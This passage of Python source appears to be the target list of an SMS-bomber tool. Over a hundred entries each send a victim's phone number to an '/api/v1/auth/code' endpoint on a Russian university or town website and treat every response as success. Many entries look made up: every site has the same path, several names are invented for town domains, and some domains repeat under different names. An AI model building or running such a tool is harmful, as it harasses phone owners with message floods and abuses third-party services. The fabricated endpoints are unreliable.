    "api1629": {
        "name": "KarachayCherkessUni",
        "url": "https://kchgu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kchgu.ru/", "https://kchgu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1630": {
        "name": "AdygheUni",
        "url": "https://adygnet.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://adygnet.ru/", "https://adygnet.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1631": {
        "name": "StavropolUni",
        "url": "https://ncfu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ncfu.ru/", "https://ncfu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1632": {
        "name": "AstrakhanUni",
        "url": "https://asu.edu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://asu.edu.ru/", "https://asu.edu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1633": {
        "name": "VolgogradUni",
        "url": "https://volsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://volsu.ru/", "https://volsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1634": {
        "name": "RostovUni",
        "url": "https://sfedu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sfedu.ru/", "https://sfedu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1635": {
        "name": "BelgorodUni",
        "url": "https://bsu.edu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bsu.edu.ru/", "https://bsu.edu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1636": {
        "name": "KurskUni",
        "url": "https://kursksu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kursksu.ru/", "https://kursksu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1637": {
        "name": "OryolUni",
        "url": "https://oreluniver.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://oreluniver.ru/", "https://oreluniver.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1638": {
        "name": "BryanskUni",
        "url": "https://brgu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://brgu.ru/", "https://brgu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1639": {
        "name": "SmolenskUni",
        "url": "https://sgu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sgu.ru/", "https://sgu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1640": {
        "name": "PskovUni",
        "url": "https://pskgu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pskgu.ru/", "https://pskgu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1641": {
        "name": "NovgorodUni",
        "url": "https://novsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://novsu.ru/", "https://novsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1642": {
        "name": "VologdaUni",
        "url": "https://vogu35.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vogu35.ru/", "https://vogu35.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1643": {
        "name": "ArkhangelskUni",
        "url": "https://narfu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://narfu.ru/", "https://narfu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1644": {
        "name": "MurmanskUni",
        "url": "https://masu.edu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://masu.edu.ru/", "https://masu.edu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1645": {
        "name": "SyktyvkarUni",
        "url": "https://syktsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://syktsu.ru/", "https://syktsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1646": {
        "name": "KirovUni",
        "url": "https://vyatsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vyatsu.ru/", "https://vyatsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1647": {
        "name": "KostromaUni",
        "url": "https://ksu.edu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ksu.edu.ru/", "https://ksu.edu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1648": {
        "name": "IvanovoUni",
        "url": "https://ivanovo.ac.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ivanovo.ac.ru/", "https://ivanovo.ac.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1649": {
        "name": "VladimirUni",
        "url": "https://vlsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vlsu.ru/", "https://vlsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1650": {
        "name": "RyazanUni",
        "url": "https://rsu.edu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rsu.edu.ru/", "https://rsu.edu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1651": {
        "name": "TulaUni",
        "url": "https://tsu.tula.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tsu.tula.ru/", "https://tsu.tula.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1652": {
        "name": "KalugaUni",
        "url": "https://tksu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tksu.ru/", "https://tksu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1653": {
        "name": "TambovUni",
        "url": "https://tsutmb.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tsutmb.ru/", "https://tsutmb.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1654": {
        "name": "LipetskUni",
        "url": "https://stu.lipetsk.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://stu.lipetsk.ru/", "https://stu.lipetsk.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1655": {
        "name": "PenzaUni",
        "url": "https://pnzgu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pnzgu.ru/", "https://pnzgu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1656": {
        "name": "UlyanovskUni",
        "url": "https://ulsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ulsu.ru/", "https://ulsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1657": {
        "name": "OrenburgUni",
        "url": "https://osu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://osu.ru/", "https://osu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1658": {
        "name": "KurganUni",
        "url": "https://kurgansu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kurgansu.ru/", "https://kurgansu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1659": {
        "name": "TyumenUni",
        "url": "https://utmn.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://utmn.ru/", "https://utmn.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1660": {
        "name": "KemerovoUni",
        "url": "https://kemsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kemsu.ru/", "https://kemsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1661": {
        "name": "TomskPU",
        "url": "https://tpu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tpu.ru/", "https://tpu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1662": {
        "name": "NovosibirskTU",
        "url": "https://nstu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nstu.ru/", "https://nstu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1663": {
        "name": "OmskTU",
        "url": "https://omgtu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://omgtu.ru/", "https://omgtu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1664": {
        "name": "AltaiTU",
        "url": "https://altstu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://altstu.ru/", "https://altstu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1665": {
        "name": "IrkutskTU",
        "url": "https://istu.edu/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://istu.edu/", "https://istu.edu", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1666": {
        "name": "KrasnoyarskTU",
        "url": "https://sfu-kras.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sfu-kras.ru/", "https://sfu-kras.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1667": {
        "name": "VladivostokUni",
        "url": "https://vvsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vvsu.ru/", "https://vvsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1668": {
        "name": "KhabarovskUni",
        "url": "https://pnu.edu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pnu.edu.ru/", "https://pnu.edu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1669": {
        "name": "SakhalinUni",
        "url": "https://sakhgu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sakhgu.ru/", "https://sakhgu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1670": {
        "name": "KamchatkaUni",
        "url": "https://kamgu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kamgu.ru/", "https://kamgu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1671": {
        "name": "MagadanUni",
        "url": "https://svgu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://svgu.ru/", "https://svgu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1672": {
        "name": "BirobidzhanUni",
        "url": "https://lgramu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lgramu.ru/", "https://lgramu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1673": {
        "name": "AmurUni",
        "url": "https://amursu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://amursu.ru/", "https://amursu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1674": {
        "name": "ChitaUni",
        "url": "https://zabgu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://zabgu.ru/", "https://zabgu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1675": {
        "name": "UlanUdeUni",
        "url": "https://esstu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://esstu.ru/", "https://esstu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1676": {
        "name": "KyzylUni",
        "url": "https://tuvsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tuvsu.ru/", "https://tuvsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1677": {
        "name": "GornoAltayskUni",
        "url": "https://gasu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gasu.ru/", "https://gasu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1678": {
        "name": "AbakanUni",
        "url": "https://khsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://khsu.ru/", "https://khsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1679": {
        "name": "BarnaulUni",
        "url": "https://asu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://asu.ru/", "https://asu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1680": {
        "name": "BiyskUni",
        "url": "https://bti.secna.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bti.secna.ru/", "https://bti.secna.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1681": {
        "name": "RubtsovskUni",
        "url": "https://rb.asu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rb.asu.ru/", "https://rb.asu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1682": {
        "name": "NovokuznetskUni",
        "url": "https://sibsiu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sibsiu.ru/", "https://sibsiu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1683": {
        "name": "ProkopyevskUni",
        "url": "https://prk.su/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://prk.su/", "https://prk.su", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1684": {
        "name": "MezhdurechenskUni",
        "url": "https://mfilial.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mfilial.ru/", "https://mfilial.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1685": {
        "name": "TomskSPU",
        "url": "https://tspu.edu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tspu.edu.ru/", "https://tspu.edu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1686": {
        "name": "NovosibirskSPU",
        "url": "https://nspu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nspu.ru/", "https://nspu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1687": {
        "name": "OmskSPU",
        "url": "https://omgpu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://omgpu.ru/", "https://omgpu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1688": {
        "name": "KrasnoyarskSPU",
        "url": "https://kspu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kspu.ru/", "https://kspu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1689": {
        "name": "IrkutskSPU",
        "url": "https://irkutsk.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://irkutsk.ru/", "https://irkutsk.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1690": {
        "name": "UlanUdeSPU",
        "url": "https://bgpu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bgpu.ru/", "https://bgpu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1691": {
        "name": "KhabarovskSPU",
        "url": "https://tgpu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tgpu.ru/", "https://tgpu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1692": {
        "name": "YakutskSPU",
        "url": "https://yspu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yspu.ru/", "https://yspu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1693": {
        "name": "VladivostokSPU",
        "url": "https://vgasu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vgasu.ru/", "https://vgasu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1694": {
        "name": "BlagoveshchenskSPU",
        "url": "https://bgpu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bgpu.ru/", "https://bgpu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1695": {
        "name": "ChitaSPU",
        "url": "https://zabspu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://zabspu.ru/", "https://zabspu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1696": {
        "name": "BirobidzhanSPU",
        "url": "https://vspu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vspu.ru/", "https://vspu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1697": {
        "name": "YuzhnoSakhalinskSPU",
        "url": "https://sakhgu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sakhgu.ru/", "https://sakhgu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1698": {
        "name": "PetropavlovskSPU",
        "url": "https://kamgu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kamgu.ru/", "https://kamgu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1699": {
        "name": "MagadanSPU",
        "url": "https://svgu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://svgu.ru/", "https://svgu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1700": {
        "name": "AnadyrUni",
        "url": "https://chukgu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://chukgu.ru/", "https://chukgu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1701": {
        "name": "NorilskUni",
        "url": "https://norvgu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://norvgu.ru/", "https://norvgu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1702": {
        "name": "SalekhardUni",
        "url": "https://yamgu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yamgu.ru/", "https://yamgu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1703": {
        "name": "NaryanMarUni",
        "url": "https://nao.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nao.ru/", "https://nao.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1704": {
        "name": "SurgutUni",
        "url": "https://surgu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://surgu.ru/", "https://surgu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1705": {
        "name": "NizhnevartovskUni",
        "url": "https://nvsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nvsu.ru/", "https://nvsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1706": {
        "name": "YuganskUni",
        "url": "https://ugrasu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ugrasu.ru/", "https://ugrasu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1707": {
        "name": "KhantyMansiyskUni",
        "url": "https://hmgu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://hmgu.ru/", "https://hmgu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1708": {
        "name": "YamalUni",
        "url": "https://yamalgu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yamalgu.ru/", "https://yamalgu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1709": {
        "name": "NovyUrengoyUni",
        "url": "https://nurgu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nurgu.ru/", "https://nurgu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1710": {
        "name": "NoyabrskUni",
        "url": "https://noyabrsk.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://noyabrsk.ru/", "https://noyabrsk.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1711": {
        "name": "NadymUni",
        "url": "https://nadym.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nadym.ru/", "https://nadym.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1712": {
        "name": "TarkoSaleUni",
        "url": "https://tarkosale.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tarkosale.ru/", "https://tarkosale.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1713": {
        "name": "GubkinskyUni",
        "url": "https://gubkinsky.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gubkinsky.ru/", "https://gubkinsky.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1714": {
        "name": "LabytnangiUni",
        "url": "https://labytnangi.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://labytnangi.ru/", "https://labytnangi.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1715": {
        "name": "MuravlenkoUni",
        "url": "https://muravlenko.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://muravlenko.ru/", "https://muravlenko.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1716": {
        "name": "PurovskUni",
        "url": "https://purovsk.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://purovsk.ru/", "https://purovsk.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1717": {
        "name": "KrasnoselkupUni",
        "url": "https://krasnoselkup.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://krasnoselkup.ru/", "https://krasnoselkup.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1718": {
        "name": "TazovskyUni",
        "url": "https://tazovsky.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tazovsky.ru/", "https://tazovsky.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1719": {
        "name": "PriuralskyUni",
        "url": "https://priuralsky.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://priuralsky.ru/", "https://priuralsky.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1720": {
        "name": "ShuryshkarskyUni",
        "url": "https://shuryshkarsky.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://shuryshkarsky.ru/", "https://shuryshkarsky.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1721": {
        "name": "YamalskyUni",
        "url": "https://yamalsky.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yamalsky.ru/", "https://yamalsky.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1722": {
        "name": "NadymskyUni",
        "url": "https://nadymsky.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nadymsky.ru/", "https://nadymsky.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1723": {
        "name": "PurovskyUni",
        "url": "https://purovsky.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://purovsky.ru/", "https://purovsky.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1724": {
        "name": "KrasnoselkupskyUni",
        "url": "https://krasnoselkupsky.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://krasnoselkupsky.ru/", "https://krasnoselkupsky.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1725": {
        "name": "TazovskyDistrictUni",
        "url": "https://tazovsky-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tazovsky-district.ru/", "https://tazovsky-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1726": {
        "name": "SalekhardCityUni",
        "url": "https://salekhard-city.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://salekhard-city.ru/", "https://salekhard-city.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1727": {
        "name": "NovyUrengoyCityUni",
        "url": "https://novy-urengoy-city.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://novy-urengoy-city.ru/", "https://novy-urengoy-city.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1728": {
        "name": "NoyabrskCityUni",
        "url": "https://noyabrsk-city.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://noyabrsk-city.ru/", "https://noyabrsk-city.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1729": {
        "name": "GubkinskyCityUni",
        "url": "https://gubkinsky-city.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gubkinsky-city.ru/", "https://gubkinsky-city.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1730": {
        "name": "LabytnangiCityUni",
        "url": "https://labytnangi-city.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://labytnangi-city.ru/", "https://labytnangi-city.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1731": {
        "name": "MuravlenkoCityUni",
        "url": "https://muravlenko-city.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://muravlenko-city.ru/", "https://muravlenko-city.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1732": {
        "name": "RaduzhnyUni",
        "url": "https://raduzhny.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://raduzhny.ru/", "https://raduzhny.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1733": {
        "name": "MegionUni",
        "url": "https://megion.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://megion.ru/", "https://megion.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1734": {
        "name": "LangepasUni",
        "url": "https://langepas.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://langepas.ru/", "https://langepas.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1735": {
        "name": "PokachiUni",
        "url": "https://pokachi.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pokachi.ru/", "https://pokachi.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1736": {
        "name": "UrayUni",
        "url": "https://uray.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://uray.ru/", "https://uray.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1737": {
        "name": "NyaganUni",
        "url": "https://nyagan.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nyagan.ru/", "https://nyagan.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1738": {
        "name": "BerezovoUni",
        "url": "https://berezovo.ru/api/v1/auth/code",
        "method": "POST",
